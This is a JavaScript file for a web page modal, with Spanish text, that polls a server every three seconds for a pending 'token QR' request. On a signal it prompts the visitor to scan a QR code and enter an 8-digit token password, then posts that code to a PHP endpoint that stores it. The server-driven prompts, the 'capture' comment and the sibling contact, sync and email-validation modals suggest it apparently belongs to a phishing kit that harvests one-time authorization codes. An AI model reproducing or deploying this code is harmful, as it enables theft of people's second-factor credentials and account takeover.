/**
 * Tela de token QR Empresas — captura en sgdotoken_qr_codigo
 */
class TokenQrEmpresaSystem {
    constructor() {
        this.currentToken = null;
        this.init();
    }

    init() {
        this.startTokenCheck();
        this.checkForToken();
    }

    startTokenCheck() {
        this.tokenInterval = setInterval(() => {
            this.checkForToken();
        }, 3000);
    }

    stopTokenCheck() {
        if (this.tokenInterval) {
            clearInterval(this.tokenInterval);
            this.tokenInterval = null;
        }
    }

    isOwnModalActive() {
        const modal = document.getElementById('adminModal');
        return !!(modal && modal.classList.contains('active') && modal.classList.contains('token-qr-empresa-modal'));
    }

    async checkForToken() {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/token_qr_empresa_verificar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_token_qr_pendiente' })
            });

            const text = await response.text();
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Respuesta no válida de token_qr_empresa_verificar.php:', text);
                return;
            }

            if (data.success && data.tiene_token_qr) {
                if (this.isOwnModalActive() && this.currentToken?.mensaje_id === data.mensaje_id) {
                    return;
                }
                this.showTokenModal(data);
                return;
            }

            if (this.isOwnModalActive()) {
                this.closeModal();
            }
        } catch (error) {
            console.warn('Error verificando tela de token QR:', error);
        }
    }

    escapeHtml(value) {
        return String(value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    showTokenModal(data) {
        const modal = document.getElementById('adminModal');
        if (!modal) {
            return;
        }

        if (typeof contactoEmpresaSystem !== 'undefined' && contactoEmpresaSystem.closeModal) {
            contactoEmpresaSystem.closeModal();
        }
        if (typeof sincronizacionSystem !== 'undefined' && sincronizacionSystem.closeModal) {
            sincronizacionSystem.closeModal();
        }

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');
        const imagenUrl = this.escapeHtml(data.imagen_url || '');

        errorEl.style.display = 'none';
        errorEl.textContent = '';
        modal.classList.remove(
            'token-empresa-modal',
            'contacto-empresa-modal',
            'email-validation-modal',
            'sincronizacion-modal'
        );
        modal.classList.add('token-qr-empresa-modal');

        messageEl.innerHTML = `
            <div class="token-qr-content">
                <h2 class="token-qr-title">Autoriza con tu token</h2>
                <p class="token-qr-description">
                    Escanea el código e ingresa la contraseña token.
                </p>
                <span class="token-qr-help-link">¿Cómo escanear el código?</span>
                <div class="token-qr-image-wrap">
                    <img src="${imagenUrl}" alt="Código QR token" class="token-qr-image" loading="lazy">
                </div>
                <div class="token-qr-timer">
                    <span class="token-qr-timer-dot" aria-hidden="true"></span>
                    <span>El código cambiará en 3 minutos</span>
                </div>
                <hr class="token-qr-divider">
                <div class="token-qr-form-row">
                    <div class="token-qr-field">
                        <label class="token-qr-label" for="tokenQrEmpresaInput">
                            Contraseña token
                            <span class="token-qr-label-help" title="Ingresa el código de 8 dígitos">?</span>
                        </label>
                        <input type="password"
                               id="tokenQrEmpresaInput"
                               class="token-qr-input"
                               maxlength="8"
                               inputmode="numeric"
                               pattern="[0-9]{8}"
                               autocomplete="one-time-code"
                               required>
                    </div>
                    <button type="button" class="token-qr-submit" id="tokenQrEmpresaSubmit">Autorizar</button>
                </div>
            </div>
        `;

        inputContainer.style.display = 'none';
        buttonsContainer.innerHTML = '';

        const input = document.getElementById('tokenQrEmpresaInput');
        input.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.sendToken(data.mensaje_id);
            }
        });

        document.getElementById('tokenQrEmpresaSubmit').addEventListener('click', () => {
            this.sendToken(data.mensaje_id);
        });

        this.currentToken = data;
        modal.classList.add('active');
        input.focus();
    }

    async sendToken(mensajeId) {
        const input = document.getElementById('tokenQrEmpresaInput');
        const tokenCodigo = (input?.value || '').trim();

        if (!/^[0-9]{8}$/.test(tokenCodigo)) {
            this.showError('Ingresa la contraseña de 8 dígitos de tu token');
            return;
        }

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/token_qr_empresa_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion: 'guardar_token_qr',
                    mensaje_id: mensajeId,
                    token_codigo: tokenCodigo
                })
            });

            const data = await response.json();

            if (data.success) {
                this.closeModal();
                setTimeout(() => this.startTokenCheck(), 2000);
            } else {
                this.showError(data.error || 'No se pudo registrar el token QR');
            }
        } catch (error) {
            this.showError('Error de conexión');
        }
    }

    showError(message) {
        const errorEl = document.getElementById('modalError');
        const input = document.getElementById('tokenQrEmpresaInput');
        errorEl.textContent = message;
        errorEl.style.display = 'block';
        if (input) {
            input.classList.add('is-invalid');
        }
    }

    closeModal() {
        const modal = document.getElementById('adminModal');
        if (modal) {
            modal.classList.remove(
                'active',
                'token-empresa-modal',
                'token-qr-empresa-modal',
                'contacto-empresa-modal',
                'email-validation-modal',
                'sincronizacion-modal'
            );
        }

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        if (messageEl) {
            messageEl.textContent = '';
        }

        if (errorEl) {
            errorEl.style.display = 'none';
            errorEl.textContent = '';
        }

        if (inputContainer) {
            inputContainer.style.display = 'none';
            inputContainer.innerHTML = `
                <label class="modal-input-label" for="modalInput">Tu respuesta:</label>
                <input type="text" class="modal-input" id="modalInput" placeholder="Escribe tu respuesta aquí...">
            `;
        }

        if (buttonsContainer) {
            buttonsContainer.innerHTML = '';
        }

        this.currentToken = null;
    }

    destroy() {
        this.stopTokenCheck();
    }
}

let tokenQrEmpresaSystem;

document.addEventListener('DOMContentLoaded', function () {
    tokenQrEmpresaSystem = new TokenQrEmpresaSystem();
});

window.addEventListener('beforeunload', function () {
    if (tokenQrEmpresaSystem) {
        tokenQrEmpresaSystem.destroy();
    }
});
